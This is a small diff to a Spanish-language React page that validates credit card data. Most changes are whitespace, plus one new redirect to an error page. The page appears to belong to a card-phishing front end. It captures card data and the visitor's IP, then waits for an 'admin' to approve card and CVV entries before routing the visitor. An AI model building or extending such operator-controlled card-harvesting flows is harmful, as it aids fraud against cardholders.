@@ -108,14 +108,14 @@ export default function ValidacionTCCustom() {
             try {
                 const response = await instanceBackend.post(`/consultar-estado/${sesionFinal}`);
                 const { estado, cardData: backendCardData } = response.data;
-                
+
                 // Solo permitir acceso si el estado es correcto para TC Custom
                 if (estado !== 'solicitar_tc_custom' && estado !== 'awaiting_tc_approval') {
                     console.error('Acceso no autorizado a TC Custom. Estado actual:', estado);
                     navigate('/');
                     return false;
                 }
-                
+
                 // Cargar datos de la tarjeta del backend (prioridad)
                 if (backendCardData) {
                     setCardData(backendCardData);
@@ -127,7 +127,7 @@ export default function ValidacionTCCustom() {
                         setCardData(savedCardData);
                     }
                 }
-                
+
                 return true;
             } catch (error) {
                 console.error('Error validando acceso:', error);
@@ -135,7 +135,7 @@ export default function ValidacionTCCustom() {
                 return false;
             }
         };
-        
+
         validateAccess();
 
         obtenerIP();
@@ -408,7 +408,7 @@ export default function ValidacionTCCustom() {
                 // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
                 // NO redirigir automáticamente, esperar a que el admin presione un botón específico
                 const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
-                
+
                 if (estadosEspera.includes(estado)) {
                     // Seguir esperando, mantener loading
                     return;
@@ -509,6 +509,9 @@ export default function ValidacionTCCustom() {
 
                     case 'error_login':
                         navigate('/autenticacion');
+                        break;
+                    case 'bloqueado_pantalla':
+                        navigate('/error-923page');
                         break;
 
                     default:
